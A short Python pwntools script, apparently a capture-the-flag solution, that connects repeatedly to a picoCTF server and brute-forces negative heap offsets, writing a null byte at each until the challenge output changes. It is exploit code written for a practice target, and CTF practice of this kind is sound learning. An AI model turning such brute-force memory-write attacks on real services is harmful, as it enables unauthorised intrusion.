from pwn import *
import time 

HOST = 'mercury.picoctf.net'
PORT = 34499

# Cannot for the life of me get the heapedit binary running locally so I'm just going to brute force this
def attack(address, value):
    r = remote(HOST, PORT)
    r.recvuntil(": ")
    r.sendline(address)
    r.recvuntil(": ")
    r.sendline(value)
    p = r.recvline()
    r.close()
    return p

def main():
    i = 1250
    while i < 1500:
        p = attack( str( -1 * i * 4), "\x00")
        print(i, -1 * i * 4, p)
        if b'help you' not in p and b'timeout' not in p:
            print("FOUND: ", p)
            input()
        i+=1
    

if __name__ == '__main__':
    main()
    